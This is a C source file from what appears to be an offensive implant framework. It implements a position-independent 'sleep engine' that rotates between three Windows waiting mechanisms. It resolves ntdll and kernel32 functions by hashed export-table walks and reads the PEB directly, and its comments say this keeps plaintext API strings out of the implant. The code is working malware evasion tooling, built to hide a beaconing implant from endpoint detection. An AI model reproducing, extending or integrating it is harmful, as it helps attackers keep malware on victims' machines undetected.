/*
 * Vendored for Tempest (imps/win-stargate). Upstream: techniques/BM-T6003.
 *
 * BM-T6003 Deferral Mosaic — PIC sleep engine (deferral_mosaic_sleep).
 *
 * Three lanes (strict round-robin 0→1→2→0):
 *   0 — Timer-queue gate — CreateTimerQueueTimer + callback signals gate event;
 *       main waits on WaitForSingleObjectEx (join surface only).
 *   1 — Keyed-event wait — NtCreateKeyedEvent + NtWaitForKeyedEvent; timer-queue
 *       callback invokes NtReleaseKeyedEvent with stable stack key address.
 *   2 — NtWaitForSingleObject — manual-reset nonsignaled event, relative timeout.
 *
 * Binding: hashed runtime walk of IMAGE_DIRECTORY_ENTRY_EXPORT only (BM-T1001 /
 * BM-T1005 spirit — no plaintext API strings in implant; values resolved from
 * mapped ntdll/kernel32 — no offline signatures or hardcoded SSNs).
 */

#include <stdint.h>
#include <windows.h>
#define WIN32_NO_STATUS
#include <winternl.h>

#include "bm_t6003_hashes.h"
#include "bm_pic_deferral_mosaic.h"

typedef NTSTATUS(WINAPI *fn_NtWaitForSingleObject)(HANDLE, BOOLEAN,
                                                    PLARGE_INTEGER);
typedef NTSTATUS(WINAPI *fn_NtCreateKeyedEvent)(PHANDLE, ACCESS_MASK,
                                                 POBJECT_ATTRIBUTES, ULONG);
typedef NTSTATUS(WINAPI *fn_NtWaitForKeyedEvent)(HANDLE, PVOID, BOOLEAN,
                                                  PLARGE_INTEGER);
typedef NTSTATUS(WINAPI *fn_NtReleaseKeyedEvent)(HANDLE, PVOID, BOOLEAN,
                                                  PIO_STATUS_BLOCK);
typedef PVOID(WINAPI *fn_RtlAllocateHeap)(HANDLE, ULONG, SIZE_T);
typedef BOOLEAN(WINAPI *fn_RtlFreeHeap)(HANDLE, ULONG, PVOID);
typedef HANDLE(WINAPI *fn_CreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL,
                                          LPCWSTR);
typedef DWORD(WINAPI *fn_WaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef WINBOOL(WINAPI *fn_CloseHandle)(HANDLE);
typedef HANDLE(WINAPI *fn_CreateTimerQueue)(VOID);

typedef WINBOOL(WINAPI *fn_CreateTimerQueueTimer)(HANDLE *, HANDLE,
                                                   WAITORTIMERCALLBACK, PVOID,
                                                   DWORD, DWORD, ULONG);
typedef WINBOOL(WINAPI *fn_DeleteTimerQueueTimer)(HANDLE, HANDLE, HANDLE);
typedef WINBOOL(WINAPI *fn_DeleteTimerQueue)(HANDLE);
typedef WINBOOL(WINAPI *fn_SetEvent)(HANDLE);
typedef WINBOOL(WINAPI *fn_ResetEvent)(HANDLE);

typedef struct deferral_mosaic_ctx {
    fn_NtWaitForSingleObject       pNtWait;
    fn_NtCreateKeyedEvent          pNtCreateKeyedEvent;
    fn_NtWaitForKeyedEvent         pNtWaitForKeyedEvent;
    fn_NtReleaseKeyedEvent         pNtReleaseKeyedEvent;
    fn_WaitForSingleObjectEx       pWaitEx;
    fn_CloseHandle                 pCloseHandle;
    fn_RtlFreeHeap                 pRtlFreeHeap;
    fn_CreateTimerQueueTimer       pCreateTimerQueueTimer;
    fn_DeleteTimerQueueTimer       pDeleteTimerQueueTimer;
    fn_DeleteTimerQueue            pDeleteTimerQueue;
    fn_SetEvent                    pSetEvent;
    fn_ResetEvent                  pResetEvent;
    HANDLE                         proc_heap;
    HANDLE                         evt_manual;
    HANDLE                         evt_timer_gate;
    HANDLE                         keyed;
    HANDLE                         tqueue;
    ULONG_PTR                      key_align;
    unsigned int                   rr;
    unsigned int                   last_lane;
} deferral_mosaic_ctx;

static uint32_t mosaic_hash_ascii(const char *s)
{
    uint32_t v = 0x9E3779B9u;
    while (*s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z')
            c = (unsigned char)(c - 'A' + 'a');
        v ^= (uint32_t)c;
        v = (v * 0x01000193u) & 0xFFFFFFFFu;
    }
    return v;
}

static void *mosaic_eat_resolve(void *base, uint32_t fn_hash)
{
    unsigned char *b = (unsigned char *)base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)b;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    IMAGE_DATA_DIRECTORY *expdir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expdir->VirtualAddress == 0 || expdir->Size == 0)
        return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(b + expdir->VirtualAddress);
    uint32_t *names = (uint32_t *)(b + exp->AddressOfNames);
    uint16_t *ords = (uint16_t *)(b + exp->AddressOfNameOrdinals);
    uint32_t *funcs = (uint32_t *)(b + exp->AddressOfFunctions);
    DWORD i;

    for (i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(b + names[i]);
        if (mosaic_hash_ascii(name) == fn_hash)
            return (void *)(b + funcs[ords[i]]);
    }
    return NULL;
}

static VOID CALLBACK mosaic_cb_timer_gate(PVOID Parameter, BOOLEAN TimerOrWaitFired)
{
    deferral_mosaic_ctx *c = (deferral_mosaic_ctx *)Parameter;
    (void)TimerOrWaitFired;
    if (c && c->pSetEvent && c->evt_timer_gate)
        (void)c->pSetEvent(c->evt_timer_gate);
}

static VOID CALLBACK mosaic_cb_keyed_release(PVOID Parameter,
                                              BOOLEAN TimerOrWaitFired)
{
    deferral_mosaic_ctx *c = (deferral_mosaic_ctx *)Parameter;
    (void)TimerOrWaitFired;
    if (c && c->pNtReleaseKeyedEvent && c->keyed)
        (void)c->pNtReleaseKeyedEvent(c->keyed, (PVOID)&c->key_align,
                                        FALSE, (PIO_STATUS_BLOCK)NULL);
}

static void mosaic_lane_timer_queue(deferral_mosaic_ctx *c, DWORD ms)
{
    HANDLE th = NULL;
    if (!c->pResetEvent || !c->pSetEvent || !c->pCreateTimerQueueTimer
        || !c->pDeleteTimerQueueTimer || !c->pWaitEx || !c->tqueue
        || !c->evt_timer_gate)
        return;

    (void)c->pResetEvent(c->evt_timer_gate);
    if (!c->pCreateTimerQueueTimer(&th, c->tqueue, mosaic_cb_timer_gate, c,
                                     ms, 0u, 0u))
        return;

    /* Join surface via Win32 wait; scheduling driver remains timer-queue. */
    (void)c->pWaitEx(c->evt_timer_gate, ms + 5000u, FALSE);
    (void)c->pDeleteTimerQueueTimer(c->tqueue, th,
                                      INVALID_HANDLE_VALUE);
}

static void mosaic_lane_keyed(deferral_mosaic_ctx *c, DWORD ms)
{
    HANDLE kh = NULL;
    LARGE_INTEGER tmo;

    if (!c->pCreateTimerQueueTimer || !c->pDeleteTimerQueueTimer
        || !c->pNtWaitForKeyedEvent || !c->keyed || !c->tqueue)
        return;

    /* Fresh key bucket each cycle — pointer-aligned. */
    c->key_align = 0u;
    /* Arm one-shot timer to release keyed wait from pool thread after ms.
     */
    if (!c->pCreateTimerQueueTimer(&kh, c->tqueue,
                                     mosaic_cb_keyed_release, c, ms,
                                     0u, 0u))
        return;

    /*
     * Wait slightly longer than ms so Release wins the race vs timeout —
     * still bounded safety if callback never fires.
     */
    tmo.QuadPart = -(((LONGLONG)ms + (LONGLONG)3500LL) * 10000LL);
    (void)c->pNtWaitForKeyedEvent(c->keyed, (PVOID)&c->key_align,
                                    FALSE, &tmo);

    (void)c->pDeleteTimerQueueTimer(c->tqueue, kh,
                                      INVALID_HANDLE_VALUE);
}

static void mosaic_lane_ntwait_evt(deferral_mosaic_ctx *c, DWORD ms)
{
    LARGE_INTEGER li;

    li.QuadPart = -((LONGLONG)ms * 10000LL);
    if (c->pNtWait && c->evt_manual)
        (void)c->pNtWait(c->evt_manual, FALSE, &li);
}

int deferral_mosaic_init(void *ntdll_base, void *kernel32_base,
                         deferral_mosaic_ctx **out_ctx)
{
    ACCESS_MASK keyed_access =
        STANDARD_RIGHTS_ALL | SYNCHRONIZE | 0x3u /* KEYEDEVENT_GENERIC bits */;
    NTSTATUS st;

    if (!ntdll_base || !kernel32_base || !out_ctx)
        return MOSAIC_ERR_RESOLVE;

    fn_RtlAllocateHeap pAlloc =
        (fn_RtlAllocateHeap)mosaic_eat_resolve(ntdll_base, H_RtlAllocateHeap);
    fn_RtlFreeHeap pFree =
        (fn_RtlFreeHeap)mosaic_eat_resolve(ntdll_base, H_RtlFreeHeap);
    if (!pAlloc || !pFree)
        return MOSAIC_ERR_RESOLVE;

    unsigned char *teb;
    __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
    unsigned char *peb = *(unsigned char **)(teb + 0x60);
    HANDLE proc_heap = *(HANDLE *)(peb + 0x30);

    deferral_mosaic_ctx *ctx = (deferral_mosaic_ctx *)pAlloc(
        proc_heap, HEAP_ZERO_MEMORY, sizeof(deferral_mosaic_ctx));
    if (!ctx)
        return MOSAIC_ERR_RESOLVE;

    ctx->proc_heap = proc_heap;
    ctx->pRtlFreeHeap = pFree;
    ctx->rr = 0u;
    ctx->last_lane = 0xFFFFFFFFu;
    ctx->evt_manual = NULL;
    ctx->evt_timer_gate = NULL;
    ctx->keyed = NULL;
    ctx->tqueue = NULL;
    ctx->key_align = 0u;

    ctx->pNtWait = (fn_NtWaitForSingleObject)mosaic_eat_resolve(
        ntdll_base, H_NtWaitForSingleObject);
    ctx->pNtCreateKeyedEvent = (fn_NtCreateKeyedEvent)mosaic_eat_resolve(
        ntdll_base, H_NtCreateKeyedEvent);
    ctx->pNtWaitForKeyedEvent = (fn_NtWaitForKeyedEvent)mosaic_eat_resolve(
        ntdll_base, H_NtWaitForKeyedEvent);
    ctx->pNtReleaseKeyedEvent = (fn_NtReleaseKeyedEvent)mosaic_eat_resolve(
        ntdll_base, H_NtReleaseKeyedEvent);

    ctx->pWaitEx = (fn_WaitForSingleObjectEx)mosaic_eat_resolve(
        kernel32_base, H_WaitForSingleObjectEx);
    ctx->pCloseHandle =
        (fn_CloseHandle)mosaic_eat_resolve(kernel32_base, H_CloseHandle);
    fn_CreateEventW pCreateEvt =
        (fn_CreateEventW)mosaic_eat_resolve(kernel32_base, H_CreateEventW);

    ctx->pCreateTimerQueueTimer =
        (fn_CreateTimerQueueTimer)mosaic_eat_resolve(
            kernel32_base, H_CreateTimerQueueTimer);
    ctx->pDeleteTimerQueueTimer =
        (fn_DeleteTimerQueueTimer)mosaic_eat_resolve(
            kernel32_base, H_DeleteTimerQueueTimer);
    fn_CreateTimerQueue pCreateTQ =
        (fn_CreateTimerQueue)mosaic_eat_resolve(kernel32_base,
                                                  H_CreateTimerQueue);
    ctx->pDeleteTimerQueue =
        (fn_DeleteTimerQueue)mosaic_eat_resolve(kernel32_base,
                                                H_DeleteTimerQueue);
    ctx->pSetEvent =
        (fn_SetEvent)mosaic_eat_resolve(kernel32_base, H_SetEvent);
    ctx->pResetEvent =
        (fn_ResetEvent)mosaic_eat_resolve(kernel32_base, H_ResetEvent);

    if (!ctx->pNtWait || !ctx->pNtCreateKeyedEvent
        || !ctx->pNtWaitForKeyedEvent || !ctx->pNtReleaseKeyedEvent
        || !ctx->pWaitEx || !ctx->pCloseHandle || !pCreateEvt
        || !ctx->pCreateTimerQueueTimer
        || !ctx->pDeleteTimerQueueTimer || !pCreateTQ || !ctx->pDeleteTimerQueue
        || !ctx->pSetEvent || !ctx->pResetEvent) {
        (void)pFree(proc_heap, 0, ctx);
        return MOSAIC_ERR_RESOLVE;
    }

    ctx->tqueue = pCreateTQ();
    if (!ctx->tqueue) {
        (void)pFree(proc_heap, 0, ctx);
        return MOSAIC_ERR_RESOLVE;
    }

    ctx->evt_manual = pCreateEvt(NULL, TRUE, FALSE, NULL);
    ctx->evt_timer_gate = pCreateEvt(NULL, TRUE, FALSE, NULL);

    if (!ctx->evt_manual || !ctx->evt_timer_gate) {
        mosaic_err_cleanup_partial:
        if (ctx->evt_manual)
            (void)ctx->pCloseHandle(ctx->evt_manual);
        if (ctx->evt_timer_gate)
            (void)ctx->pCloseHandle(ctx->evt_timer_gate);
        if (ctx->tqueue && ctx->pDeleteTimerQueue)
            (void)ctx->pDeleteTimerQueue(ctx->tqueue);
        (void)pFree(proc_heap, 0, ctx);
        return MOSAIC_ERR_RESOLVE;
    }

    st = ctx->pNtCreateKeyedEvent(&ctx->keyed, keyed_access, NULL, 0u);
    if (st != (NTSTATUS)0 || ctx->keyed == NULL)
        goto mosaic_err_cleanup_partial;

    *out_ctx = ctx;
    return MOSAIC_OK;
}

void deferral_mosaic_sleep(deferral_mosaic_ctx *ctx, unsigned int ms_dw)
{
    DWORD ms;

    if (!ctx || ms_dw == 0u)
        return;

    ms = (DWORD)ms_dw;

    {
        unsigned int lane = ctx->rr % 3u;
        ctx->rr++;

#ifdef MOSAIC_LANE_MASK
        unsigned int tries = 0;
        while (tries < 3u && (((MOSAIC_LANE_MASK >> (lane % 3u)) & 1u) == 0u)) {
            lane = ctx->rr % 3u;
            ctx->rr++;
            tries++;
        }
#endif

        ctx->last_lane = lane % 3u;
        switch (lane % 3u) {
        case 0u:
            mosaic_lane_timer_queue(ctx, ms);
            break;
        case 1u:
            mosaic_lane_keyed(ctx, ms);
            break;
        default:
            mosaic_lane_ntwait_evt(ctx, ms);
            break;
        }
    }
}

unsigned deferral_mosaic_last_lane(const deferral_mosaic_ctx *ctx)
{
    if (!ctx)
        return 0xFFFFFFFFu;
    return ctx->last_lane;
}

void deferral_mosaic_free(deferral_mosaic_ctx *ctx)
{
    if (!ctx || !ctx->pRtlFreeHeap)
        return;

    if (ctx->tqueue && ctx->pDeleteTimerQueue)
        (void)ctx->pDeleteTimerQueue(ctx->tqueue);

    if (ctx->evt_manual && ctx->pCloseHandle)
        (void)ctx->pCloseHandle(ctx->evt_manual);
    if (ctx->evt_timer_gate && ctx->pCloseHandle)
        (void)ctx->pCloseHandle(ctx->evt_timer_gate);

    /*
     * Closing keyed handle relies on NtClose syscall path indirectly via kernel;
     * CloseHandle is the Win32 object close for keyed events mapped as HANDLE.
     */
    if (ctx->keyed && ctx->pCloseHandle)
        (void)ctx->pCloseHandle(ctx->keyed);

    (void)ctx->pRtlFreeHeap(ctx->proc_heap, 0, ctx);
}
